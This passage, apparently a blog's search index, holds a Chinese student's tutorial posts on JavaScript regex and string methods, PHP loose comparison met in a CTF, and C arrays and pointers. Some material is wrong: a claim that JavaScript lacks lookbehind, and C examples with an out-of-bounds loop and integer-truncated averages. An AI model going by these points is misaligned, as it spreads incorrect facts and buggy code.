&#x2F;(?:[a-z]+)(?:\d+)&#x2F;; &#x2F;&#x2F;非捕获性分组匹配</span><br><span class="line">var arr2 &#x3D; pattern2.exec(str2);  </span><br><span class="line">console.log(arr2) &#x2F;&#x2F;[&#39;aaa111&#39;]  结果正确</span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「lihefei_coder」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;lihefei_coder&#x2F;article&#x2F;details&#x2F;53022253</span><br></pre></td></tr></table></figure>



<h3 id="前瞻：-和"><a href="#前瞻：-和" class="headerlink" title="前瞻：(?=)和(?!)"></a><strong>前瞻：(?=)和(?!)</strong></h3><p>正向前瞻匹配一批图片格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;正向前瞻，匹配.jpg后缀文件名</span><br><span class="line">var str &#x3D; &#39;123.jpg,456.gif,abc.jpg&#39;;</span><br><span class="line">var partern &#x3D; &#x2F;\w+(?&#x3D;\.jpg)&#x2F;g; &#x2F;&#x2F;正向前瞻匹配</span><br><span class="line">console.log(str.match(partern)); &#x2F;&#x2F;[&#39;123&#39;, &#39;abc&#39;]   返回结果正确，没有匹配456.gif</span><br></pre></td></tr></table></figure>



<h3 id="后顾：-lt-和-lt-—JavaScript不支持"><a href="#后顾：-lt-和-lt-—JavaScript不支持" class="headerlink" title="后顾：(?&lt;=)和(?&lt;!)  —JavaScript不支持"></a>后顾：(?&lt;=)和(?&lt;!)  <em>—JavaScript不支持</em></h3><p>后顾分为正向后顾和反(负)向后顾，正向后顾<strong>(?&lt;=表达式)</strong>表示前面要有什么，反向后顾(?表示前面不能有什么。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;正向后顾</span><br><span class="line">(?&lt;&#x3D;abc) &#x2F;&#x2F;前面需要有abc</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;反向后顾</span><br><span class="line">(?&lt;!abc) &#x2F;&#x2F;前面不能有abc</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JS</category>
      </categories>
  </entry>
  <entry>
    <title>JS test()/exec()函数 [字符串是否匹配]</title>
    <url>/2020/01/04/JS-test-exec-%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="test"><a href="#test" class="headerlink" title="test()"></a>test()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true，否则返回 false。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regex.test(string);</span><br></pre></td></tr></table></figure>

<p><em>即判断string中有无与regex中匹配的字符串</em></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var str &#x3D; &#x2F;G&#x2F;;               &#x2F;&#x2F;也可以用var str&#x3D;RegEx(&quot;G&quot;);</span><br><span class="line">    document.write(str.test(&quot;Welcome to Albatross-G!&quot;));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&lt;script&gt;中两行可以变成一行（如下）</span><br><span class="line">&#x2F;&#x2F;document.write(&#x2F;G&#x2F;.test(&quot;Welcome to Albatross-G!&quot;)</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">true</span><br></pre></td></tr></table></figure>

<h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><h2 id="定义和用法-1"><a href="#定义和用法-1" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>exec() 方法用于检索字符串中的正则表达式的匹配。</p>
<p>该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regex.exec(string);</span><br></pre></td></tr></table></figure>

<p><em>与test()相比不同是，如果匹配到了会返回匹配内容而不是true。</em></p>
<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var str &#x3D; &#x2F;G&#x2F;;               &#x2F;&#x2F;也可以用var str&#x3D;RegEx(&quot;G&quot;);</span><br><span class="line">    document.write(str.exec(&quot;Welcome to Albatross-G!&quot;));</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&lt;script&gt;中两行可以变成一行（如下）</span><br><span class="line">&#x2F;&#x2F;document.write(&#x2F;G&#x2F;.exec(&quot;Welcome to Albatross-G!&quot;)</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>JS search()/repalce()函数 [找/替代字符串]</title>
    <url>/2020/01/03/JS%20search()%20repalce()%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.search(regex(正则表达式));</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://albatross-g.github.io/2020/01/04/JS-正则表达式/" target="_blank" rel="noopener">正则表达式(regex)</a></p>
</blockquote>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var str &#x3D; &quot;Visit Runoob!&quot;; </span><br><span class="line">    var n &#x3D; str.search(&#x2F;runoob&#x2F;i);&#x2F;&#x2F;其中i表示搜索不区分大小写</span><br><span class="line">    document.write(n);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure>



<h2 id="replace"><a href="#replace" class="headerlink" title="replace()"></a>replace()</h2><h3 id="定义和用法-1"><a href="#定义和用法-1" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.replace(regex(被替换),string(用来替换));</span><br></pre></td></tr></table></figure>

<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var str &#x3D; &quot;Visit Baidu!&quot;; </span><br><span class="line">    var n &#x3D; str.replace(&#x2F;baidu&#x2F;i,&quot;Albatross-G&quot;);</span><br><span class="line">    document.write(n);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>结果是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Visit Albatross-G!</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>JS indexOf()函数 [检索字符在字符串的位置]</title>
    <url>/2020/01/03/JS%20indexOf()%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="indexOf"><a href="#indexOf" class="headerlink" title="indexOf()"></a>indexOf()</h2><h3 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h3><p>indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。</p>
<p>如果没有找到匹配的字符串则返回 -1。</p>
<p><strong>注意：</strong> indexOf() 方法区分大小写。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.indexOf(searchvalue,start)</span><br></pre></td></tr></table></figure>

<h3 id="参数值"><a href="#参数值" class="headerlink" title="参数值"></a>参数值</h3><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>searchvalue</td>
<td>必需。规定需检索的字符串值</td>
</tr>
<tr>
<td>start</td>
<td>可选的整数参数。规定在字符串中开始检索的位置。它的合法取值是 0 到 string Object.length - 1。如省略该参数，则将从字符串的首字符开始检索。</td>
</tr>
</tbody></table>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var str&#x3D;&quot;Hello world, welcome to the universe.&quot;;</span><br><span class="line">var n&#x3D;str.indexOf(&quot;e&quot;);</span><br><span class="line">document.write(n); &#x2F;&#x2F;输出变量不需要加&quot;&quot;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>



<h3 id="相似函数lastIndexOf"><a href="#相似函数lastIndexOf" class="headerlink" title="相似函数lastIndexOf()"></a>相似函数lastIndexOf()</h3><p><em>注意i要大写！</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var str&#x3D;&quot;Hello world, welcome to the universe.&quot;;</span><br><span class="line">var n&#x3D;str.lastIndexOf(&quot;e&quot;);</span><br><span class="line">document.write(n);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">35</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>JS 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP弱类型比较</title>
    <url>/2020/01/03/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[<p>前两天在做南邮ctf“md5 collision”时，遇到了关于php弱类型比较的问题，当时搞得似懂非懂，所以今天查了有关资料然后稍微总结一下。</p>
<h2 id="php完全相等-“-”"><a href="#php完全相等-“-”" class="headerlink" title="php完全相等(“===”)"></a>php完全相等(“===”)</h2><p>“===” 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。<br>也就是说如果两边字符串类型就不同的话，就直接判断为两边不相等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(1&#x3D;&#x3D;&#x3D;&quot;1abc&quot;);</span><br></pre></td></tr></table></figure>
<p>结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool(false)</span><br></pre></td></tr></table></figure>
<p>甚至</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(1&#x3D;&#x3D;&#x3D;1e0);</span><br></pre></td></tr></table></figure>
<p>这种我们正常认知里数值相等的结果也是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool(false)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内。</p>
</blockquote>
<p>所以1e0被认为是浮点数，类型不同自然不相等。</p>
<blockquote>
<p><strong>注意：</strong>使用var_dump函数时，在括号内如果给整型(如1)增加””变成(“1”),则”1”会被认为是字符串。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(1&#x3D;&#x3D;&#x3D;&quot;1&quot;)</span><br></pre></td></tr></table></figure>
<p>结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool(false)</span><br></pre></td></tr></table></figure>

<h2 id="php弱相等-“-”"><a href="#php弱相等-“-”" class="headerlink" title="php弱相等(“==”)"></a>php弱相等(“==”)</h2><h3 id="php弱相等比较表"><a href="#php弱相等比较表" class="headerlink" title="php弱相等比较表"></a>php弱相等比较表</h3><p>首先看一张图，一般比较就参考下图。</p>
<p><img src="/2020/01/03/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/weak.jpg" alt="weak"></p>
<h3 id="php弱相等时类型的转化"><a href="#php弱相等时类型的转化" class="headerlink" title="php弱相等时类型的转化"></a>php弱相等时类型的转化</h3><p>首先一定要注意：<strong>只有当类型不同时才会转化！</strong><br>“1e1234567”会被看成浮点型，正常计算法则计算即可<br>“1e1234abc”会被看成字符串，转化规则：<br>取第一个字母之前的数字，如无数字则为0。<br>如：1a1234abc转化为1，abcd转化为0。</p>
<h3 id="一些发现"><a href="#一些发现" class="headerlink" title="一些发现"></a>一些发现</h3><p>可是笔者经过一些测试发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(&quot;1e2abc&quot;&#x3D;&#x3D;100);</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool(true)</span><br></pre></td></tr></table></figure>
<p>也就是说如果第一个非e/E字母前满足科学计数法形式，会先计算科学计数法数变成整型然后去掉之后字母。</p>
<p><img src="/2020/01/03/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/1.jpg" alt="1"></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>比较</tag>
        <tag>数据类型的转化</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-01-03日目标</title>
    <url>/2020/01/02/2020-01-03%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<p>1. 9:30在1307考html<br>2. 10min英语听力+10个英语单词<br>3. <a href="https://www.runoob.com/js/js-typeof.html" target="_blank" rel="noopener">JS typeof操作符</a>-JS代码规范<br>4. <a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">南邮ctf “这题不是web”</a><br>5. CSS盒子模型</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>以数组作为函数参数的两种方法</title>
    <url>/2020/01/01/%E4%BB%A5%E6%95%B0%E7%BB%84%E4%BD%9C%E4%B8%BA%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>数组可以作为函数的参数使用，进行数据传送。数组作为函数参数有两种形式。<br>（1）把元素作为实参使用。<br>（2）把数组名作为函数的形参和实参使用。</p>
<h2 id="数组元素作为函数实参"><a href="#数组元素作为函数实参" class="headerlink" title="数组元素作为函数实参"></a>数组元素作为函数实参</h2><h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdafx.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void test(int v);</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    int a[10]&#x3D;&#123;1,2,3,4,-1,-2,-3,-4,2,3&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for(i&#x3D;0;i&lt;&#x3D;10;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        test(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void test(int v)</span><br><span class="line">&#123;</span><br><span class="line">    if(v&gt;0)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%d\n&quot;,v);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;0\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数组名作为函数参数"><a href="#数组名作为函数参数" class="headerlink" title="数组名作为函数参数"></a>数组名作为函数参数</h2><p>注：<br>（1）与数组元素作为函数参数不同的是，用数组名作为函数参数时，要求形参与相对应的实参都必须是类型相同的数组，否则会发生错误。<br>（2）用数组名作为函数参数时，并不是进行值的传递，即不是把实参数组的每一个元素的值都赋与形参数组的各个元素。因为实际上形参数组并不存在，编译系统并不为形参数组分配内存。<br>数据的传递：数组名就是数组的首地址。因此在数组名作为函数参数时所进行的传递只是地址的传递，也就是说把实参数组的首地址赋予形参数组名。形参数组名取得该首地址之后，也等于有了实际的数组，即实参与形参有一段共用的内存空间。</p>
<h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdafx.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void test (int b[10]);</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    int a[10]&#x3D;&#123;2,4,6,8,10,12,14,16,18,20&#125;;</span><br><span class="line">    test(a);</span><br><span class="line">    putchar(&#39;\n&#39;);</span><br><span class="line">&#125;</span><br><span class="line">void test (int b[10])</span><br><span class="line">&#123;</span><br><span class="line">    int i&#x3D;0;</span><br><span class="line">    for(;i&lt;10;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%6d&quot;,b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有一个一维数组score，内放10个学生成绩，求平均成绩。（写一个average函数获取平均成绩）。</span><br><span class="line"> </span><br><span class="line">#include &lt;stdafx.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">double average(double array[10]);&#x2F;*函数声明*&#x2F;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    double score[10]&#x3D;&#123;82,100,55,80,64,78,26,65,36,85&#125;,result;</span><br><span class="line">    result&#x3D;average(score);</span><br><span class="line">    printf(&quot;%lf\n&quot;,result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double average(double array[10])</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    double f&#x3D;0;</span><br><span class="line">    for(i&#x3D;0;i&lt;&#x3D;9;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        f+&#x3D;array[i];</span><br><span class="line">    &#125;</span><br><span class="line">    f &#x2F;&#x3D; 10;</span><br><span class="line">    return (f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>函数</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title>初学C语言指针的一些思考</title>
    <url>/2020/01/01/%E5%88%9D%E5%AD%A6C%E8%AF%AD%E8%A8%80%E6%8C%87%E9%92%88%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<h2 id="函数求平均数-没用到指针"><a href="#函数求平均数-没用到指针" class="headerlink" title="函数求平均数(没用到指针)"></a>函数求平均数(没用到指针)</h2><p>我们先看一个用函数求平均数的例子<br>这里面没有用到指针</p>
<h3 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int Getaverage(int arr[5],int size);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int sz[5]&#x3D;&#123;1,2,3,4,5&#125;;</span><br><span class="line">	double average;</span><br><span class="line">	average&#x3D;Getaverage(sz,5);</span><br><span class="line">	printf(&quot;%lf&quot;,average);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int Getaverage(int arr[5],int size)</span><br><span class="line">&#123;</span><br><span class="line">	int i,sum&#x3D;0;</span><br><span class="line">	double ave;</span><br><span class="line">	for(i&#x3D;0;i&lt;size;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		sum&#x3D;sum+arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	ave&#x3D;sum&#x2F;size;</span><br><span class="line">	return ave;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（在C语言中若要把数组作为函数参数，要遵循其规则，详情可见文章<a href="https://albatross-g.github.io/2020/01/01/%E4%BB%A5%E6%95%B0%E7%BB%84%E4%BD%9C%E4%B8%BA%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">以数组作为函数参数的两种方法.docx</a>）</p>
<h2 id="函数求平均数-用到指针"><a href="#函数求平均数-用到指针" class="headerlink" title="函数求平均数(用到指针)"></a>函数求平均数(用到指针)</h2><p>按文章中的规定此时 形参（arr[5]）和 实参（sz）类型必须相同，所以如果我们main中的sz数组中数字个数发生了变化，则Getaverage也要改变形参，变得非常麻烦，于是我们有了以下对指针的引用。</p>
<h3 id="普通版"><a href="#普通版" class="headerlink" title="普通版"></a>普通版</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">&#x2F;* 函数声明 *&#x2F;</span><br><span class="line">double getAverage(int *arr, int size);</span><br><span class="line"> </span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">   &#x2F;* 带有 5 个元素的整型数组  *&#x2F;</span><br><span class="line">   int balance[5] &#x3D; &#123;1000, 2, 3, 17, 50&#125;;</span><br><span class="line">   double avg;</span><br><span class="line"> </span><br><span class="line">   &#x2F;* 传递一个指向数组的指针作为参数 *&#x2F;</span><br><span class="line">   avg &#x3D; getAverage( balance, 5 ) ;</span><br><span class="line"> </span><br><span class="line">   &#x2F;* 输出返回值  *&#x2F;</span><br><span class="line">   printf(&quot;Average value is: %f\n&quot;, avg );</span><br><span class="line">   </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double getAverage(int *arr, int size)</span><br><span class="line">&#123;</span><br><span class="line">  int    i, sum &#x3D; 0;      </span><br><span class="line">  double avg;          </span><br><span class="line"> </span><br><span class="line">  for (i &#x3D; 0; i &lt; size; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    sum +&#x3D; arr[i];</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  avg &#x3D; (double)sum &#x2F; size;</span><br><span class="line"> </span><br><span class="line">  return avg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样的话，*arr相当于把数组的首地址分配给了函数，就不必对每一次实参的改变调整形参。</p>
<h3 id="进阶版"><a href="#进阶版" class="headerlink" title="进阶版"></a>进阶版</h3><p>再更进一步，可以思考设计一个更贴近实际作用地程序，即scanf输入所需计算的数（个数不限）而得到平均值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">double getAverage(int *arr, int size);</span><br><span class="line"> </span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">	int i,a[999],n&#x3D;0;</span><br><span class="line">    for(i&#x3D;0;;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">        n++;       </span><br><span class="line">        if(getchar()&#x3D;&#x3D;&#39;\n&#39;)break; </span><br><span class="line">    &#125;</span><br><span class="line">    double avg;</span><br><span class="line">	avg &#x3D; getAverage(a,n) ;</span><br><span class="line"> </span><br><span class="line">    printf(&quot;Average value is: %f\n&quot;, avg );</span><br><span class="line">   </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double getAverage(int *arr, int size)</span><br><span class="line">&#123;</span><br><span class="line">  int    i, sum &#x3D; 0;      </span><br><span class="line">  double avg;          </span><br><span class="line"> </span><br><span class="line">  for (i &#x3D; 0; i &lt; size; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    sum +&#x3D; arr[i];</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  avg &#x3D; (double)sum &#x2F; size;</span><br><span class="line"> </span><br><span class="line">  return avg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>函数</tag>
        <tag>指针</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2020/01/01/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      <categories>
        <category>guide</category>
      </categories>
      <tags>
        <tag>guide</tag>
      </tags>
  </entry>
</search>
